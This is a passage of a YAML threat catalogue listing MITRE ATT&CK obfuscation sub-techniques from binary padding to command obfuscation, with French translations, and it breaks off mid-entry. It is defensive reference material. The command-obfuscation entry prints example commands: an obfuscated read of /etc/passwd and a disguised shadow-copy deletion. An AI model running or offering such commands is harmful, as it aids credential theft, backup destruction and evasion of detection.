  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.001
    ref_id: T1027.001
    name: Binary Padding
    description: "Adversaries may use binary padding to add junk data and change the\
      \ on-disk representation of malware. This can be done without affecting the\
      \ functionality or behavior of a binary, but can increase the size of the binary\
      \ beyond what some security tools are capable of handling due to file size limitations.\
      \ \n\nBinary padding effectively changes the checksum of the file and can also\
      \ be used to avoid hash-based blocklists and static anti-virus signatures.(Citation:\
      \ ESET OceanLotus) The padding used is commonly generated by a function to create\
      \ junk data and then appended to the end or applied to sections of malware.(Citation:\
      \ Securelist Malware Tricks April 2017) Increasing the file size may decrease\
      \ the effectiveness of certain tools and detection capabilities that are not\
      \ designed or configured to scan large files. This may also reduce the likelihood\
      \ of being collected for analysis. Public file scanning services, such as VirusTotal,\
      \ limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal\
      \ FAQ)\nhttps://attack.mitre.org/techniques/T1027/001"
    translations:
      fr:
        name: Bourrage binaire
        description: "Les adversaires peuvent utiliser un bourrage binaire pour ajouter\
          \ des donn\xE9es inutilisables et modifier la repr\xE9sentation sur disque\
          \ des malwares. Cela peut \xEAtre fait sans affecter la fonctionnalit\xE9\
          \ ou le comportement d\u2019un binaire, mais peut augmenter la taille du\
          \ binaire au-del\xE0 de ce que certains outils de s\xE9curit\xE9 peuvent\
          \ g\xE9rer en raison des limitations de taille des fichiers. \n\nLe bourrage\
          \ binaire modifie effectivement la somme de contr\xF4le du fichier et peut\
          \ aussi \xEAtre utilis\xE9 pour \xE9viter les listes de blocage bas\xE9\
          es sur des hachages et les signatures antivirus statiques. (Citation : ESET\
          \ OceanLotus) Le bourrage utilis\xE9 est g\xE9n\xE9ralement g\xE9n\xE9r\xE9\
          \ par une fonction pour cr\xE9er des donn\xE9es inutilisables, puis ajout\xE9\
          \ \xE0 la fin ou appliqu\xE9 \xE0 des sections de malware. (Citation : Astuces\
          \ de malware Securelist avril 2017) Augmenter la taille du fichier peut\
          \ diminuer l\u2019efficacit\xE9 de certains outils et capacit\xE9s de d\xE9\
          tection qui ne sont pas con\xE7us ou configur\xE9s pour scanner de gros\
          \ fichiers. Cela peut \xE9galement r\xE9duire la probabilit\xE9 d\u2019\xEA\
          tre collect\xE9 pour analyse. Les services publics de num\xE9risation de\
          \ fichiers, tels que VirusTotal, limitent la taille maximale d\u2019un fichier\
          \ t\xE9l\xE9charg\xE9 \xE0 analyser. (Citation : FAQ VirusTotal)\nhttps://attack.mitre.org/techniques/T1027/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.002
    ref_id: T1027.002
    name: Software Packing
    description: "Adversaries may perform software packing or virtual machine software\
      \ protection to conceal their code. Software packing is a method of compressing\
      \ or encrypting an executable. Packing an executable changes the file signature\
      \ in an attempt to avoid signature-based detection. Most decompression techniques\
      \ decompress the executable code in memory. Virtual machine software protection\
      \ translates an executable's original code into a special format that only a\
      \ special virtual machine can run. A virtual machine is then called to run this\
      \ code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software\
      \ packing are called packers. Example packers are MPRESS and UPX. A more comprehensive\
      \ list of known packers is available, but adversaries may create their own packing\
      \ techniques that do not leave the same artifacts as well-known packers to evade\
      \ defenses.(Citation: Awesome Executable Packing)\nhttps://attack.mitre.org/techniques/T1027/002"
    translations:
      fr:
        name: Empaquetage logiciel
        description: "Les adversaires peuvent effectuer un empaquetage logiciel ou\
          \ une protection logicielle de machine virtuelle pour dissimuler leur code.\
          \ Le package logiciel est une m\xE9thode de compression ou de chiffrement\
          \ d\u2019un ex\xE9cutable. Le packing d\u2019un ex\xE9cutable modifie la\
          \ signature du fichier afin d\u2019\xE9viter la d\xE9tection bas\xE9e sur\
          \ la signature. La plupart des techniques de d\xE9compression d\xE9compressent\
          \ le code ex\xE9cutable en m\xE9moire. La protection logicielle par machine\
          \ virtuelle traduit le code original d\u2019un ex\xE9cutable dans un format\
          \ sp\xE9cial que seule une machine virtuelle sp\xE9ciale peut ex\xE9cuter.\
          \ Une machine virtuelle est alors appel\xE9e pour ex\xE9cuter ce code. (Citation\
          \ : ESET FinFisher janv. 2018) \n\nLes utilitaires utilis\xE9s pour effectuer\
          \ le package logiciel sont appel\xE9s packers. Des exemples d\u2019emballages\
          \ sont MPRESS et UPX. Une liste plus compl\xE8te des packers connus est\
          \ disponible, mais les adversaires peuvent cr\xE9er leurs propres techniques\
          \ de packing qui ne laissent pas les m\xEAmes artefacts que les packers\
          \ connus pour \xE9chapper aux d\xE9fenses. (Citation : Emballage ex\xE9\
          cutable g\xE9nial)\nhttps://attack.mitre.org/techniques/T1027/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.003
    ref_id: T1027.003
    name: Steganography
    description: "Adversaries may use steganography techniques in order to prevent\
      \ the detection of hidden information. Steganographic techniques can be used\
      \ to hide data in digital media such as images, audio tracks, video clips, or\
      \ text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early\
      \ example of malware that used steganography. It encrypted the gathered information\
      \ from a victim's system and hid it within an image before exfiltrating the\
      \ image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a\
      \ threat group used\u202F<code>Invoke-PSImage</code>\u202Fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ commands in an image file (.png) and execute the code on a victim's system.\
      \ In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ code downloaded another obfuscated script to gather intelligence from the\
      \ victim's machine and communicate it back to the adversary.(Citation: McAfee\
      \ Malicious Doc Targets Pyeongchang Olympics)\nhttps://attack.mitre.org/techniques/T1027/003"
    translations:
      fr:
        name: "St\xE9ganographie"
        description: "Les adversaires peuvent utiliser des techniques de st\xE9ganographie\
          \ afin d\u2019emp\xEAcher la d\xE9tection d\u2019informations cach\xE9es.\
          \ Les techniques st\xE9ganographiques peuvent \xEAtre utilis\xE9es pour\
          \ masquer des donn\xE9es dans des m\xE9dias num\xE9riques tels que des images,\
          \ des pistes audio, des clips vid\xE9o ou des fichiers texte.\n\n[Duqu](https://attack.mitre.org/software/S0038)\
          \ \xE9tait un des premiers exemples de logiciels malveillants utilisant\
          \ la st\xE9ganographie. Il chifrait les informations recueillies dans le\
          \ syst\xE8me de la victime et les dissimulait dans une image avant d\u2019\
          exfiltrer l\u2019image vers un serveur C2. (Citation : Wikip\xE9dia Duqu)\
          \ \n\n\xC0 la fin de 2017, un groupe de menaces utilisait <code>Invoke-PSImage</code>\
          \ pour masquer les commandes [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ dans un fichier image (.png) et ex\xE9cuter le code sur le syst\xE8me\
          \ d\u2019une victime. Dans ce cas particulier, le code [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ t\xE9l\xE9chargeait un autre script obfusqu\xE9 pour recueillir des renseignements\
          \ de la machine de la victime et les communiquer \xE0 l\u2019adversaire.\
          \ (Citation : Un docteur malveillant de McAfee vise les Jeux olympiques\
          \ de Pyeongchang)\nhttps://attack.mitre.org/techniques/T1027/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.004
    ref_id: T1027.004
    name: Compile After Delivery
    description: 'Adversaries may attempt to make payloads difficult to discover and
      analyze by delivering files to victims as uncompiled code. Text-based source
      code files may subvert analysis and scrutiny from protections targeting executables/binaries.
      These payloads will need to be compiled before execution; typically via native
      utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation:
      ClearSky MuddyWater Nov 2018)


      Source code payloads may also be encrypted, encoded, and/or embedded within
      other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566).
      Payloads may also be delivered in formats unrecognizable and inherently benign
      to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into
      a proper executable binary with a bundled compiler and execution framework.(Citation:
      TrendMicro WindowsAppMac)

      https://attack.mitre.org/techniques/T1027/004'
    translations:
      fr:
        name: "Compilation apr\xE8s la livraison"
        description: "Les adversaires peuvent tenter de rendre les charges utiles\
          \ difficiles \xE0 d\xE9couvrir et \xE0 analyser en livrant des fichiers\
          \ aux victimes sous forme de code non compil\xE9. Les fichiers de code source\
          \ bas\xE9s sur le texte peuvent subvertir l\u2019analyse et la surveillance\
          \ des protections ciblant les ex\xE9cutables/binaires. Ces charges utiles\
          \ devront \xEAtre compil\xE9es avant leur ex\xE9cution ; g\xE9n\xE9ralement\
          \ via des utilitaires natifs tels que ilasm.exe(Citation : ATTACK IQ), csc.exe\
          \ ou GCC/MinGW. (Citation : ClearSky MuddyWater nov. 2018)\n\nLes charges\
          \ utiles du code source peuvent \xE9galement \xEAtre chiffr\xE9es, encod\xE9\
          es et/ou int\xE9gr\xE9es dans d\u2019autres fichiers, comme celles livr\xE9\
          es sous forme de [Phishing](https://attack.mitre.org/techniques/T1566).\
          \ Les charges utiles peuvent \xE9galement \xEAtre livr\xE9es dans des formats\
          \ m\xE9connaissables et intrins\xE8quement b\xE9nins pour le syst\xE8me\
          \ d\u2019exploitation natif (ex. : EXE sur macOS/Linux) avant d\u2019\xEA\
          tre ensuite (re)compil\xE9es dans un binaire ex\xE9cutable appropri\xE9\
          \ avec un compilateur et un cadre d\u2019ex\xE9cution inclus. (Citation\
          \ : TrendMicro WindowsAppMac)\nhttps://attack.mitre.org/techniques/T1027/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.005
    ref_id: T1027.005
    name: Indicator Removal from Tools
    description: 'Adversaries may remove indicators from tools if they believe their
      malicious tool was detected, quarantined, or otherwise curtailed. They can modify
      the tool by removing the indicator and using the updated version that is no
      longer detected by the target''s defensive systems or subsequent targets that
      may use similar systems.


      A good example of this is when malware is detected with a file signature and
      quarantined by anti-virus software. An adversary who can determine that the
      malware was quarantined because of its file signature may modify the file to
      explicitly avoid that signature, and then re-use the malware.

      https://attack.mitre.org/techniques/T1027/005'
    translations:
      fr:
        name: Retrait des indicateurs des outils
        description: "Les adversaires peuvent retirer des indicateurs des outils s\u2019\
          ils estiment que leur outil malveillant a \xE9t\xE9 d\xE9tect\xE9, mis en\
          \ quarantaine ou autrement restreint. Ils peuvent modifier l\u2019outil\
          \ en retirant l\u2019indicateur et en utilisant la version mise \xE0 jour\
          \ qui n\u2019est plus d\xE9tect\xE9e par les syst\xE8mes d\xE9fensifs de\
          \ la cible ou par les cibles suivantes qui pourraient utiliser des syst\xE8\
          mes similaires.\n\nUn bon exemple est lorsque des malwares sont d\xE9tect\xE9\
          s avec une signature de fichier et mis en quarantaine par un logiciel antivirus.\
          \ Un adversaire qui peut d\xE9terminer que le malware a \xE9t\xE9 mis en\
          \ quarantaine en raison de sa signature de fichier peut modifier le fichier\
          \ pour \xE9viter explicitement cette signature, puis r\xE9utiliser le malware.\n\
          https://attack.mitre.org/techniques/T1027/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.006
    ref_id: T1027.006
    name: HTML Smuggling
    description: 'Adversaries may smuggle data and files past content filters by hiding
      malicious payloads inside of seemingly benign HTML files. HTML documents can
      store large binary objects known as JavaScript Blobs (immutable data that represents
      raw bytes) that can later be constructed into file-like objects. Data may also
      be stored in Data URLs, which enable embedding media type or MIME files inline
      of HTML documents. HTML5 also introduced a download attribute that may be used
      to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation:
      Outlflank HTML Smuggling 2018)


      Adversaries may deliver payloads to victims that bypass security controls through
      HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes.
      Security controls such as web content filters may not identify smuggled malicious
      files inside of HTML/JS files, as the content may be based on typically benign
      MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious
      files or data can be obfuscated and hidden inside of HTML files through Data
      URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim
      (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)),
      potentially bypassing content filters.


      For example, JavaScript Blobs can be abused to dynamically generate malicious
      files in the victim machine and may be dropped to disk by abusing JavaScript
      functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security
      2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling
      2018)(Citation: nccgroup Smuggling HTA 2017)

      https://attack.mitre.org/techniques/T1027/006'
    translations:
      fr:
        name: Contrebande HTML
        description: "Les adversaires peuvent faire passer des donn\xE9es et des fichiers\
          \ \xE0 travers des filtres de contenu en dissimulant des charges utiles\
          \ malveillantes \xE0 l\u2019int\xE9rieur de fichiers HTML apparemment inoffensifs.\
          \ Les documents HTML peuvent stocker de gros objets binaires appel\xE9s\
          \ JavaScript Blobs (donn\xE9es immuables repr\xE9sentant des octets bruts)\
          \ qui peuvent ensuite \xEAtre construits en objets de type fichier. Les\
          \ donn\xE9es peuvent \xE9galement \xEAtre stock\xE9es dans des URL de donn\xE9\
          es, qui permettent d\u2019int\xE9grer des fichiers de type m\xE9dia ou MIME\
          \ en ligne de documents HTML. HTML5 a \xE9galement introduit un attribut\
          \ de t\xE9l\xE9chargement qui peut \xEAtre utilis\xE9 pour initier le t\xE9\
          l\xE9chargement de fichiers. (Citation : HTML Contrebande Menlo Security\
          \ 2020)(Citation : Contrebande HTML Outlflank 2018)\n\nLes adversaires peuvent\
          \ livrer des charges utiles aux victimes qui contournent les contr\xF4les\
          \ de s\xE9curit\xE9 via la contrebande HTML en abusant des blobs JavaScript\
          \ et/ou des attributs de t\xE9l\xE9chargement HTML5. Les contr\xF4les de\
          \ s\xE9curit\xE9 tels que les filtres de contenu web peuvent ne pas identifier\
          \ les fichiers malveillants introduits en contrebande \xE0 l\u2019int\xE9\
          rieur des fichiers HTML/JS, car le contenu peut \xEAtre bas\xE9 sur des\
          \ types MIME g\xE9n\xE9ralement inoffensifs tels que <code>texte/plain</code>\
          \ et/ou <code>texte/html</code>. Les fichiers ou donn\xE9es malveillants\
          \ peuvent \xEAtre obscurciss\xE9s et cach\xE9s \xE0 l\u2019int\xE9rieur\
          \ de fichiers HTML via des URL de donn\xE9es et/ou des blobs JavaScript,\
          \ et peuvent \xEAtre d\xE9modusqu\xE9s lorsqu\u2019ils atteignent la victime\
          \ (c\u2019est-\xE0-dire [D\xE9obfuscare/D\xE9coder fichiers ou informations](https://attack.mitre.org/techniques/T1140)),\
          \ contournant potentiellement les filtres de contenu.\n\nPar exemple, les\
          \ Blobs JavaScript peuvent \xEAtre abus\xE9s pour g\xE9n\xE9rer dynamiquement\
          \ des fichiers malveillants dans la machine victime et peuvent \xEAtre d\xE9\
          pos\xE9s sur le disque en abusant de fonctions JavaScript telles que <code>msSaveBlob</code>.\
          \ (Citation : HTML Contrebande Menlo Security 2020)(Citation : MSTIC NOBELIUM\
          \ mai 2021)(Citation : Contrebande HTML Outlflank 2018)(Citation : nccgroup\
          \ Smuggling HTA 2017)\nhttps://attack.mitre.org/techniques/T1027/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.007
    ref_id: T1027.007
    name: Dynamic API Resolution
    description: 'Adversaries may obfuscate then dynamically resolve API functions
      called by their malware in order to conceal malicious functionalities and impair
      defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106)
      functions provided by the OS to perform various tasks such as those involving
      processes, files, and other system artifacts.


      API functions called by malware may leave static artifacts such as strings in
      payload files. Defensive analysts may also uncover which functions a binary
      file may execute via an import address table (IAT) or other structures that
      help dynamically link calling code to the shared modules that provide functions.(Citation:
      Huntress API Hash)(Citation: IRED API Hashing)


      To avoid static or other defensive analysis, adversaries may use dynamic API
      resolution to conceal malware characteristics and functionalities. Similar to
      [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API
      resolution may change file signatures and obfuscate malicious API function calls
      until they are resolved and invoked during runtime.


      Various methods may be used to obfuscate malware calls to API functions. For
      example, hashes of function names are commonly stored in malware in lieu of
      literal strings. Malware can use these hashes (or other identifiers) to manually
      reproduce the linking and loading process using functions such as `GetProcAddress()`
      and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated
      using encryption or other string manipulation tricks (requiring various forms
      of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)
      during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation:
      Huntress API Hash)

      https://attack.mitre.org/techniques/T1027/007'
    translations:
      fr:
        name: "R\xE9solution dynamique des API"
        description: "Les adversaires peuvent obscurcir puis r\xE9soudre dynamiquement\
          \ les fonctions API appel\xE9es par leur logiciel malveillant afin de dissimuler\
          \ des fonctionnalit\xE9s malveillantes et d\u2019entraver l\u2019analyse\
          \ d\xE9fensive. Malware utilise couramment diverses fonctions [API native](https://attack.mitre.org/techniques/T1106)\
          \ fournies par le syst\xE8me d\u2019exploitation pour effectuer diverses\
          \ t\xE2ches telles que celles impliquant des processus, des fichiers et\
          \ d\u2019autres artefacts syst\xE8me.\n\nLes fonctions API appel\xE9es par\
          \ un malware peuvent laisser des artefacts statiques tels que des cha\xEE\
          nes dans les fichiers de charge utile. Les analystes d\xE9fensifs peuvent\
          \ \xE9galement d\xE9couvrir quelles fonctions un fichier binaire peut ex\xE9\
          cuter via une table d\u2019adresses d\u2019importation (IAT) ou d\u2019\
          autres structures qui aident \xE0 lier dynamiquement le code d\u2019appel\
          \ aux modules partag\xE9s qui fournissent des fonctions. (Citation : Hachage\
          \ API Huntress)(Citation : Hachage de l\u2019API IRED)\n\nPour \xE9viter\
          \ une analyse statique ou d\xE9fensive, les adversaires peuvent utiliser\
          \ la r\xE9solution dynamique de l\u2019API pour dissimuler les caract\xE9\
          ristiques et fonctionnalit\xE9s du malware. Similaire \xE0 [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
          \ la r\xE9solution dynamique de l\u2019API peut modifier les signatures\
          \ de fichiers et obscurcir les appels de fonctions API malveillantes jusqu\u2019\
          \xE0 ce qu\u2019ils soient r\xE9solus et invoqu\xE9s en temps r\xE9el.\n\
          \nDiverses m\xE9thodes peuvent \xEAtre utilis\xE9es pour obscurcir les appels\
          \ de logiciels malveillants vers les fonctions API. Par exemple, les hachages\
          \ des noms de fonctions sont couramment stock\xE9s dans des logiciels malveillants\
          \ au lieu de cha\xEEnes litt\xE9rales. Les logiciels malveillants peuvent\
          \ utiliser ces hachages (ou d\u2019autres identifiants) pour reproduire\
          \ manuellement le processus de liaison et de chargement en utilisant des\
          \ fonctions telles que \xAB GetProcAddress() \xBB et \xAB LoadLibrary()\
          \ \xBB. Ces hachages/identifiants peuvent \xE9galement \xEAtre davantage\
          \ obscurcis gr\xE2ce au chiffrement ou \xE0 d\u2019autres astuces de manipulation\
          \ de cha\xEEnes (n\xE9cessitant diverses formes de [D\xE9obfusque/D\xE9\
          coder des fichiers ou informations](https://attack.mitre.org/techniques/T1140)\
          \ lors de l\u2019ex\xE9cution). (Citation : Packers d\u2019API BlackHat)(Citation\
          \ : Drakonia Hinvoke)(Citation : Hachage API Huntress)\nhttps://attack.mitre.org/techniques/T1027/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.008
    ref_id: T1027.008
    name: Stripped Payloads
    description: "Adversaries may attempt to make a payload difficult to analyze by\
      \ removing symbols, strings, and other human readable information. Scripts and\
      \ executables may contain variables names and other strings that help developers\
      \ document code functionality. Symbols are often created by an operating system\u2019\
      s `linker` when executable payloads are compiled. Reverse engineers use these\
      \ symbols and strings to analyze code and to identify functionality in payloads.(Citation:\
      \ Mandiant golang stripped binaries explanation)(Citation: intezer stripped\
      \ binaries elf files 2018)\n\nAdversaries may use stripped payloads in order\
      \ to make malware analysis more difficult. For example, compilers and other\
      \ tools may provide features to remove or obfuscate strings and symbols. Adversaries\
      \ have also used stripped payload formats, such as run-only AppleScripts, a\
      \ compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002),\
      \ to evade detection and analysis. The lack of human-readable information may\
      \ directly hinder detection and analysis of payloads.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021)\nhttps://attack.mitre.org/techniques/T1027/008"
    translations:
      fr:
        name: "Charges utiles d\xE9pouill\xE9es"
        description: "Les adversaires peuvent tenter de rendre une charge utile difficile\
          \ \xE0 analyser en supprimant des symboles, des cha\xEEnes de caract\xE8\
          res et d\u2019autres informations lisibles par l\u2019humain. Les scripts\
          \ et ex\xE9cutables peuvent contenir des noms de variables et d\u2019autres\
          \ cha\xEEnes qui aident les d\xE9veloppeurs \xE0 documenter la fonctionnalit\xE9\
          \ du code. Les symboles sont souvent cr\xE9\xE9s par le \xAB liaison \xBB\
          \ d\u2019un syst\xE8me d\u2019exploitation lors de la compilation de charges\
          \ utiles ex\xE9cutables. Les ing\xE9nieurs inverses utilisent ces symboles\
          \ et cha\xEEnes pour analyser le code et identifier les fonctionnalit\xE9\
          s des charges utiles. (Citation : Explication des binaires d\xE9pouill\xE9\
          s de Mandiant golang)(Citation : intezer binaires d\xE9pouill\xE9s fichiers\
          \ elfs 2018)\n\nLes adversaires peuvent utiliser des charges utiles d\xE9\
          pouill\xE9es afin de compliquer l\u2019analyse des logiciels malveillants.\
          \ Par exemple, les compilateurs et autres outils peuvent offrir des fonctionnalit\xE9\
          s pour supprimer ou obscurcir cha\xEEnes et symboles. Les adversaires ont\
          \ \xE9galement utilis\xE9 des formats de charges utiles d\xE9pouill\xE9\
          es, tels que AppleScripts \xE0 ex\xE9cution uniquement, une version compil\xE9\
          e et d\xE9nud\xE9e d'[AppleScript](https://attack.mitre.org/techniques/T1059/002),\
          \ pour \xE9chapper \xE0 la d\xE9tection et \xE0 l\u2019analyse. Le manque\
          \ d\u2019informations lisibles par l\u2019humain peut directement entraver\
          \ la d\xE9tection et l\u2019analyse des charges utiles. (Citation : SentinelLabs\
          \ inversant les scripts Apple-Only run-only 2021)\nhttps://attack.mitre.org/techniques/T1027/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.009
    ref_id: T1027.009
    name: Embedded Payloads
    description: "Adversaries may embed payloads within other files to conceal malicious\
      \ content from defenses. Otherwise seemingly benign files (such as scripts and\
      \ executables) may be abused to carry and obfuscate malicious payloads and content.\
      \ In some cases, embedded payloads may also enable adversaries to [Subvert Trust\
      \ Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution\
      \ controls such as digital signatures and notarization tickets.(Citation: Sentinel\
      \ Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation:\
      \ Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003),\
      \ though does not involve weaving malicious content into specific bytes and\
      \ patterns related to legitimate digital media formats.(Citation: GitHub PSImage)\
      \ \n\nFor example, adversaries have been observed embedding payloads within\
      \ or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2)\
      \ Adversaries have also been observed nesting payloads (such as executables\
      \ and run-only scripts) inside a file of the same format.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021) \n\nEmbedded content may also be used\
      \ as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads\
      \ used to infect benign system processes.(Citation: Trend Micro) These embedded\
      \ then injected payloads may be used as part of the modules of malware designed\
      \ to provide specific features such as encrypting C2 communications in support\
      \ of an orchestrator module. For example, an embedded module may be injected\
      \ into default browsers, allowing adversaries to then communicate via the network.(Citation:\
      \ Malware Analysis Report ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
    translations:
      fr:
        name: "Charges utiles embarqu\xE9es"
        description: "Les adversaires peuvent int\xE9grer des charges utiles dans\
          \ d\u2019autres fichiers pour dissimuler un contenu malveillant aux d\xE9\
          fenses. Des fichiers apparemment inoffensifs (tels que des scripts et ex\xE9\
          cutables) peuvent \xEAtre abus\xE9s pour transporter et obscurcir des charges\
          \ utiles et contenus malveillants. Dans certains cas, les charges utiles\
          \ int\xE9gr\xE9es peuvent \xE9galement permettre aux adversaires de [Subvertir\
          \ les contr\xF4les de confiance](https://attack.mitre.org/techniques/T1553)\
          \ en n\u2019affectant pas les contr\xF4les d\u2019ex\xE9cution tels que\
          \ les signatures num\xE9riques et les tickets de notarisation. (Citation\
          \ : Laboratoires Sentinelles) \n\nLes adversaires peuvent int\xE9grer des\
          \ charges utiles dans diff\xE9rents formats de fichiers pour dissimuler\
          \ les charges utiles. (Citation : Microsoft Learn) Cela est similaire \xE0\
          \ [St\xE9ganographie](https://attack.mitre.org/techniques/T1027/003), bien\
          \ qu\u2019il n\u2019implique pas de tisser du contenu malveillant dans des\
          \ octets et des motifs sp\xE9cifiques li\xE9s \xE0 des formats num\xE9riques\
          \ l\xE9gitimes. (Citation : GitHub PSImage) \n\nPar exemple, des adversaires\
          \ ont \xE9t\xE9 observ\xE9s en train d\u2019int\xE9grer des charges utiles\
          \ dans ou en superposition \xE0 un binaire autrement b\xE9nin. (Citation\
          \ : Securelist Dtrack2) Des adversaires ont \xE9galement \xE9t\xE9 observ\xE9\
          s en train d\u2019imbriquer des charges utiles (telles que des ex\xE9cutables\
          \ et des scripts d\u2019ex\xE9cution uniquement) \xE0 l\u2019int\xE9rieur\
          \ d\u2019un fichier du m\xEAme format. (Citation : SentinelLabs inversant\
          \ les scripts Apple-Only run-only 2021) \n\nLe contenu int\xE9gr\xE9 peut\
          \ \xE9galement \xEAtre utilis\xE9 comme charges utiles d'[injection de proc\xE9\
          d\xE9](https://attack.mitre.org/techniques/T1055) destin\xE9es \xE0 infecter\
          \ des processus b\xE9nins du syst\xE8me. (Citation : Trend Micro) Ces charges\
          \ utiles int\xE9gr\xE9es puis inject\xE9es peuvent \xEAtre utilis\xE9es\
          \ dans les modules de logiciels malveillants con\xE7us pour fournir des\
          \ fonctionnalit\xE9s sp\xE9cifiques telles que le chiffrement des communications\
          \ C2 en support d\u2019un module orchestrator. Par exemple, un module embarqu\xE9\
          \ peut \xEAtre inject\xE9 dans les navigateurs par d\xE9faut, permettant\
          \ aux adversaires de communiquer via le r\xE9seau. (Citation : Rapport d\u2019\
          analyse de malwares ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.010
    ref_id: T1027.010
    name: Command Obfuscation
    description: "Adversaries may obfuscate content during command execution to impede\
      \ detection. Command-line obfuscation is a method of making strings and patterns\
      \ within commands and scripts more difficult to signature and analyze. This\
      \ type of obfuscation can be included within commands executed by delivered\
      \ payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively\
      \ via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse\
      \ syntax that utilizes various symbols and escape characters (such as spacing,\
      \  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining\
      \ the same intended functionality.(Citation: RC PowerShell) Many languages support\
      \ built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft\
      \ PowerShellB64) Adversaries may also manually implement command obfuscation\
      \ via string splitting (`\u201CWor\u201D+\u201Cd.Application\u201D`), order\
      \ and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p\
      \ '/tmp/:&$NiA'`), as well as various tricks involving passing strings through\
      \ tokens/environment variables/input streams.(Citation: Bashfuscator Command\
      \ Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also\
      \ use tricks such as directory traversals to obfuscate references to the binary\
      \ being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\\
      ..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation:\
      \ Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and\
      \ <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation:\
      \ Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)\nhttps://attack.mitre.org/techniques/T1027/010"
    translations:
      fr:
        name: Obfuscation des commandes
        description: "Les adversaires peuvent obscurcir le contenu lors de l\u2019\
          ex\xE9cution de la commande pour entraver la d\xE9tection. L\u2019obfuscation\
          \ en ligne de commande est une m\xE9thode permettant de rendre les cha\xEE\
          nes et les motifs au sein des commandes et scripts plus difficiles \xE0\
          \ signer et \xE0 analyser. Ce type d\u2019obfuscation peut \xEAtre inclus\
          \ dans les commandes ex\xE9cut\xE9es par des charges utiles livr\xE9es (par\
          \ exemple, [Phishing](https://attack.mitre.org/techniques/T1566) et [Drive-by\
          \ Compromise](https://attack.mitre.org/techniques/T1189)) ou de mani\xE8\
          re interactive via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
          \ (Citation : Akamai JS)(Citation : Malware Monday VBE)\n\nPar exemple,\
          \ les adversaires peuvent abuser d\u2019une syntaxe utilisant divers symboles\
          \ et caract\xE8res d\u2019\xE9chappement (tels que l\u2019espacement, \xAB\
          \ ^ \xBB, \xAB + \xBB. \xAB $ \xBB et \xAB % \xBB) pour rendre les commandes\
          \ difficiles \xE0 analyser tout en conservant la m\xEAme fonctionnalit\xE9\
          \ pr\xE9vue. (Citation : RC PowerShell) De nombreux langages prennent en\
          \ charge l\u2019obfuscation int\xE9gr\xE9e sous forme de base64 ou d\u2019\
          encodage URL. (Citation : Microsoft PowerShellB64) Les adversaires peuvent\
          \ aussi impl\xE9menter manuellement l\u2019obfuscation des commandes via\
          \ la division des cha\xEEnes (\xAB Wor \xBB+\"d.Application\"'), l\u2019\
          ordre et le casing des caract\xE8res ('rev <<<'dwssap/cte/ tac''), le globing\
          \ ('mkdir -p '/tmp/\_:$NiA''), ainsi que diverses astuces impliquant le\
          \ passage de cha\xEEnes \xE0 travers des jetons/variables d\u2019environnement/flux\
          \ d\u2019entr\xE9e. (Citation : Obfusqueurs de commandement Bashfuscator)(Citation\
          \ : Obfuscation FireEye juin 2017)\n\nLes adversaires peuvent aussi utiliser\
